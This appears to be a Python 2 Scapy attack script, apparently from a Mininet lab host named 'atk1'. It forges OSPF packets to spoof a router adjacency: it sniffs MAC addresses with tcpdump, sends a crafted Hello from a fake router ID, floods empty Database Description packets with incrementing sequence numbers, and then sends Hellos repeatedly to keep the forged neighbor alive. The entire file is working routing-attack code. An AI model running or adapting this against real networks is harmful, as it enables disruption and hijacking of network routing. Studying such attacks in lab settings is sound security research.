#!/usr/bin/env python

import termcolor as T # grey red green yellow blue magenta cyan white
import os
import sys
import ctypes
import datetime

from subprocess import Popen, PIPE
from scapy.all import *
from random import randint
from time import sleep


load_contrib("ospf")


SOURCE_ADDRESS = '10.0.1.3'
DESTINATION_ADDRESS = '10.0.1.2'
HELLO_DESTINATION_ADDRESS = '224.0.0.5'
HELLO_INTERVAL = 10
DEAD_INTERVAL = 40
TTL = 64
OUTPUT_INTERFACE = 'atk1-eth0'

eight_bit_space = [1L, 2L, 4L, 8L, 16L, 32L, 64L, 128L]


def log(s, col="green"):
	print T.colored(s, col)


def send_hello_packet(srcMAC, dstMAC, srcIP, dstIP):
	eth_header = Ether(src=srcMAC, dst=dstMAC)

	ip_header = IP(src=srcIP, dst=dstIP, ttl=TTL, proto=89)

	ospf_header = OSPF_Hdr(\
		src='2.2.2.3')

	ospf_payload = OSPF_Hello(\
		hellointerval=HELLO_INTERVAL, \
		deadinterval=DEAD_INTERVAL,\
		mask='0.0.0.0',\
		neighbors=['2.2.2.2', '1.1.1.1'],\
		#router='10.0.1.3',\
		#backup='10.0.1.2',\
		options=2L)

	frame = eth_header/ip_header/ospf_header/ospf_payload
	frame.show()

	sendp(frame, iface=OUTPUT_INTERFACE)


def send_empty_dbd_messages(srcMAC, dstMAC, srcIP, dstIP, n, interval):
	eth_header = Ether(src=srcMAC, dst=dstMAC)

	ip_header = IP(src=srcIP, dst=dstIP, ttl=TTL, proto=89)

	seqNum = randint(0, 2147483648)

	ospf_header = OSPF_Hdr(\
		src='2.2.2.3',\
		type=2)

	ospf_payload = OSPF_DBDesc(\
		dbdescr=7L,\
		options=2L)

	frame = eth_header/ip_header/ospf_header/ospf_payload
	frame.show()

	for i in xrange(0, n):
		print 'sending %d-th dbd message with seqNum %d at %s' % (i+1, seqNum + i, datetime.datetime.now().strftime("%H:%M:%S"))

		sleep(interval)

		frame.payload.payload.payload.ddseq = seqNum + i

		sendp(frame, iface=OUTPUT_INTERFACE)


def send_hello_messages(srcMAC, dstMAC, srcIP, dstIP, interval):
	eth_header = Ether(src=srcMAC, dst=dstMAC)

	ip_header = IP(src=srcIP, dst=dstIP, ttl=TTL, proto=89)

	ospf_header = OSPF_Hdr(\
		src='2.2.2.3')

	ospf_payload = OSPF_Hello(\
		hellointerval=HELLO_INTERVAL, \
		deadinterval=DEAD_INTERVAL,\
		mask='0.0.0.0',\
		neighbors=['2.2.2.2', '1.1.1.1'],\
		#router='10.0.1.3',\
		#backup='10.0.1.2',\
		options=2L)

	frame = eth_header/ip_header/ospf_header/ospf_payload
	frame.show()

	i = 0

	while True:
		print 'sending %d-th hello message at %s' % (i+1, datetime.datetime.now().strftime("%H:%M:%S"))

		sleep(interval)

		sendp(frame, iface=OUTPUT_INTERFACE)


def retrieve_mac_address(iface, ip_address):
	p = Popen(('sudo', 'tcpdump', '-i', iface, '-lnSe'), stdout=PIPE)

	mac_address = None

	for row in iter(p.stdout.readline, b''):
		mac_address = extract_mac_address(row, ip_address)

		if mac_address != None:
			p.kill()

			break

	return mac_address


def extract_mac_address(row, ip_address):
	values = row.split(' ')

	if ip_address in values[9]:
		return values[1].replace(',','')

	if ip_address in values[11]:
		return values[3].replace(',','')

	return None


def retrieve_atk1_mac_address(iface):
	p = Popen(('ifconfig'), stdout=PIPE)

	for row in iter(p.stdout.readline, b''):
		if iface in row:
			values = row.split(' ')

			p.kill()

			return values[5]

	p.kill()

	return None


def main():
	src_mac_address = retrieve_atk1_mac_address('atk1-eth0')
	assert src_mac_address is not None
	print 'source MAC address', src_mac_address

	dst_mac_address = retrieve_mac_address('atk1-eth0', '10.0.3.1')
	assert dst_mac_address is not None
	print 'destination MAC address', dst_mac_address

	send_hello_packet(src_mac_address, dst_mac_address, SOURCE_ADDRESS, DESTINATION_ADDRESS)

	send_empty_dbd_messages(src_mac_address, dst_mac_address, SOURCE_ADDRESS, DESTINATION_ADDRESS, 10, 2)

	send_hello_messages(src_mac_address, dst_mac_address, SOURCE_ADDRESS, DESTINATION_ADDRESS, 30)


if __name__ == "__main__":
	main()
